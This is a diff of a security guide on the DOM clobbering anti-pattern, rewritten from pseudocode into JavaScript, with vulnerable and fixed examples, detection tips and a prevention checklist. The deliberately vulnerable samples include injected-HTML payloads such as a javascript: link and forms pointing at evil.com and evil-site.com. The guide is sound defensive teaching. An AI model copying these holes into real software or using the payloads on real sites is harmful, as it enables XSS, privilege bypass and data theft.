@@ -1,196 +1,95 @@
 ---
-name: dom-clobbering-anti-pattern
-description: Security anti-pattern for DOM clobbering vulnerabilities (CWE-79 variant). Use when generating or reviewing code that accesses DOM elements by ID, uses global variables, or relies on document properties. Detects HTML injection that overwrites JavaScript globals.
+name: "dom-clobbering-anti-pattern"
+description: "Security anti-pattern for DOM Clobbering vulnerabilities (CWE-79 variant). Use when generating or reviewing code that accesses DOM elements by ID, uses global variables, or relies on document properties. Detects HTML injection that overwrites JavaScript globals."
 ---
 
 # DOM Clobbering Anti-Pattern
 
 **Severity:** Medium
 
-## Risk
+## Summary
+DOM Clobbering is a subtle but dangerous vulnerability where attacker-controlled HTML can overwrite global JavaScript variables or DOM properties. When an HTML element is created with an `id` or `name` attribute, some browsers automatically create a global variable with that name, pointing to the element. This can "clobber" (overwrite) legitimate variables or objects in the application, leading to client-side logic bypasses, XSS, and other attacks. This is especially risky even when using HTML sanitizers, as `id` and `name` are often allowed.
 
-DOM clobbering occurs when HTML elements with `id` or `name` attributes create global variables that override JavaScript globals or DOM properties. Even sanitized HTML can clobber the DOM. This leads to:
+## The Anti-Pattern
+The anti-pattern occurs when an application's JavaScript code relies on global variables that can be overwritten by HTML elements injected by an attacker. The code expects to access a legitimate object or value but instead gets a reference to a DOM element.
 
-- Overwriting security-critical JavaScript functions
-- Hijacking navigation and form submissions
-- Bypassing client-side security checks
-- Enabling further XSS attacks
+### BAD Code Example
+```javascript
+// VULNERABLE: Using a global variable that can be clobbered.
 
-## How DOM Clobbering Works
+// Imagine this HTML is injected into the page by an attacker:
+// <div id="appConfig"></div>
 
-```pseudocode
-// HTML elements with id/name create global variables
-
-// This HTML:
-<img id="alert">
-
-// Creates: window.alert === <img> element
-// Now: alert(1) throws error instead of showing alert
-
-// This HTML:
-<form id="document"><input name="cookie" value="fake"></form>
-
-// Can interfere with: document.cookie
-// The form element may shadow the real document object
-```
-
-## BAD Pattern: Global Lookups for Security Operations
-
-```pseudocode
-// VULNERABLE: Using global lookups for security-critical operations
-
-FUNCTION get_config_value(key):
-    // Attacker injects: <img id="apiKey" src="x" data-value="evil">
-    RETURN window[key]  // Returns the img element, not config value
-END FUNCTION
-
-FUNCTION redirect_to_profile(user_id):
-    // Attacker injects: <a id="profileUrl" href="javascript:alert(1)">
-    url = document.getElementById("profileUrl")
-    location = url.href  // XSS!
-END FUNCTION
-
-FUNCTION check_admin_status():
-    // Attacker injects: <img id="isAdmin" src="x">
-    IF window.isAdmin:
-        show_admin_panel()  // Element is truthy, grants access
-    END IF
-END FUNCTION
-```
-
-## BAD Pattern: Chained Property Access
-
-```pseudocode
-// VULNERABLE: Nested clobbering through forms
-
-// Attacker injects:
-<form id="config">
-    <input name="apiUrl" value="https://evil.com">
-    <input name="debug" value="true">
-</form>
-
-// Code expects config object:
-FUNCTION init_app():
-    api_url = config.apiUrl  // Gets input element or its value
-    debug_mode = config.debug  // Attacker controls this
-END FUNCTION
-```
-
-## GOOD Pattern: Namespaced Configuration
-
-```pseudocode
-// SECURE: Use namespaced config object
-
-CONSTANT APP_CONFIG = {
-    apiUrl: "https://api.example.com",
-    debug: FALSE
+// The application code expects `appConfig` to be a configuration object.
+// However, `window.appConfig` now points to the <div> element above.
+if (window.appConfig.isAdmin) {
+    // A DOM element is "truthy", so this check passes.
+    // The attacker gains access to the admin panel without being an admin.
+    showAdminPanel();
 }
 
-FUNCTION get_config_value(key):
-    // DON'T: return window[key]
-    // DON'T: return document.getElementById(key).value
+// Another example:
+// Injected HTML: <form id="someForm" action="https://evil-site.com">
+// Legitimate button: <button onclick="submitForm()">Submit</button>
 
-    // DO: Use a namespaced config object
-    RETURN APP_CONFIG[key]
-END FUNCTION
+function submitForm() {
+    // The code intends to get a legitimate form, but gets the injected one.
+    var form = document.getElementById('someForm');
+    form.submit(); // Submits data to the attacker's site.
+}
 ```
 
-## GOOD Pattern: Prefixed Element IDs
+### GOOD Code Example
+```javascript
+// SECURE: Avoid global variables and validate DOM elements.
 
-```pseudocode
-// SECURE: Use unique prefixes for security-critical IDs
+// 1. Use a namespace for your application's objects.
+const myApp = {};
+myApp.config = {
+    isAdmin: false
+    // ... other config
+};
 
-FUNCTION get_element_by_id_safe(id):
-    // Prefix with app-specific namespace
-    RETURN document.getElementById("app__" + id)
-END FUNCTION
+// Access the configuration through the namespace.
+if (myApp.config.isAdmin) {
+    showAdminPanel();
+}
 
-FUNCTION render_user_content(html):
-    // Sanitize AND prefix any IDs
-    sanitized = DOMPurify.sanitize(html, {
-        SANITIZE_DOM: TRUE,
-        // Custom hook to prefix all IDs
-        hooks: {
-            afterSanitizeAttributes: FUNCTION(node):
-                IF node.hasAttribute("id"):
-                    node.id = "user_content__" + node.id
-                END IF
-            END FUNCTION
-        }
-    })
-    RETURN sanitized
-END FUNCTION
+// 2. Validate the type of element retrieved from the DOM.
+function submitForm() {
+    var form = document.getElementById('someForm');
+    // Check that the element is actually a form before using it.
+    if (form instanceof HTMLFormElement) {
+        form.submit();
+    } else {
+        console.error("Error: 'someForm' is not a valid form element.");
+    }
+}
+
+// 3. Freeze critical objects to prevent modification.
+Object.freeze(myApp.config);
 ```
-
-## GOOD Pattern: Type Validation After DOM Queries
-
-```pseudocode
-// SECURE: Validate types after DOM queries
-
-FUNCTION get_form_element(id):
-    element = document.getElementById(id)
-
-    IF element IS NULL:
-        THROW Error("Element not found")
-    END IF
-
-    IF NOT (element instanceof HTMLFormElement):
-        THROW Error("Expected form element")
-    END IF
-
-    RETURN element
-END FUNCTION
-
-FUNCTION get_input_value(id):
-    element = document.getElementById(id)
-
-    IF NOT (element instanceof HTMLInputElement):
-        THROW Error("Expected input element")
-    END IF
-
-    RETURN element.value
-END FUNCTION
-```
-
-## Dangerous Global Names
-
-| Name | Risk |
-|------|------|
-| `alert`, `confirm`, `prompt` | Disable dialogs |
-| `document`, `window` | Shadow core objects |
-| `location`, `top`, `self` | Control navigation |
-| `name`, `status` | Common property names |
-| `cookie`, `domain` | Security-sensitive properties |
-| Form names matching API objects | Shadow application config |
 
 ## Detection
+- **Review JavaScript Code:** Look for direct access to global variables (e.g., `window.someConfig`, or just `someConfig`) where the variable is expected to be an object or hold a security-critical value.
+- **Analyze HTML Sanitizer Configuration:** Check if your HTML sanitizer allows `id` and `name` attributes. While often necessary for functionality, it's the root cause of DOM Clobbering.
+- **Test for Clobbering:** Try to inject HTML elements with `id` attributes that match the names of global variables used in your application's code. For example, if your code uses a `config` object, inject `<div id="config">`.
 
-Test with elements having IDs matching:
-- JavaScript globals (`alert`, `name`, `location`)
-- Object properties (`cookie`, `domain`)
-- Application-specific config names
-- Nested forms with chained name/id attributes
-- Security-critical element IDs in your application
+## Prevention
+- [ ] **Avoid using global variables** for security-critical operations or configurations. Instead, use a private namespace (e.g., `const myApp = { config: { ... } };`).
+- [ ] **Freeze critical objects** using `Object.freeze()` to make them read-only, preventing them from being overwritten.
+- [ ] **Validate the type** of any object retrieved from the DOM before using it (e.g., `if (elem instanceof HTMLFormElement)`).
+- [ ] **Use a robust HTML sanitizer**, but be aware that allowing `id` and `name` attributes still leaves you vulnerable. DOM Clobbering protection must be implemented in your JavaScript code.
+- [ ] **Use prefixes for element IDs** that are unlikely to collide with global variables (e.g., `id="myapp-user-form"`).
 
-## Prevention Checklist
-
-- [ ] Never use global lookups (`window[key]`) for security operations
-- [ ] Use namespaced configuration objects
-- [ ] Prefix user-content element IDs with unique namespace
-- [ ] Validate element types after DOM queries
-- [ ] Use Object.freeze() on security-critical configs
-- [ ] Enable DOMPurify's SANITIZE_DOM option
-- [ ] Avoid relying on element IDs for security logic
-
-## Related Patterns
-
-- [xss](../xss/) - Base XSS pattern
-- [mutation-xss](../mutation-xss/) - Related sanitizer bypass
-- [missing-input-validation](../missing-input-validation/) - Type validation
+## Related Security Patterns & Anti-Patterns
+- [Cross-Site Scripting (XSS) Anti-Pattern](../xss/): DOM Clobbering can be a vector to enable XSS.
+- [Mutation XSS Anti-Pattern](../mutation-xss/): Another sanitizer-bypass technique that abuses the way browsers parse HTML.
+- [Missing Input Validation Anti-Pattern](../missing-input-validation/): Failing to validate the type of a DOM element is a form of missing input validation.
 
 ## References
-
 - [OWASP Top 10 A05:2025 - Injection](https://owasp.org/Top10/2025/A05_2025-Injection/)
+- [OWASP GenAI LLM05:2025 - Improper Output Handling](https://genai.owasp.org/llmrisk/llm05-improper-output-handling/)
 - [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
 - [CAPEC-588: DOM-Based XSS](https://capec.mitre.org/data/definitions/588.html)
 - [PortSwigger DOM Clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
